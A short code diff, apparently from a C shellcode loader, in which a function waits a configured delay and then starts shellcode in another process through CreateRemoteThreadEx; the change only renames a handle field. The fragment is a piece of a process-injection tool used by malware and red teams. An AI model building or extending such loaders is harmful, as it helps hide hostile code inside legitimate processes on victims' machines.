@@ -13,7 +13,7 @@ BOOL execution_load_apis() {
 
 BOOL execution_run(MemoryInfo memInfo) {
 	ldr_sleep(g_ldr->config->DelayBefore);
-	HANDLE hThread = g_ldr->apis->CreateRemoteThreadEx(memInfo.remoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress,
+	HANDLE hThread = g_ldr->apis->CreateRemoteThreadEx(memInfo.remoteHandle, NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress,
 		NULL,
 		0, NULL, NULL);
 	if (hThread == NULL) return FALSE;
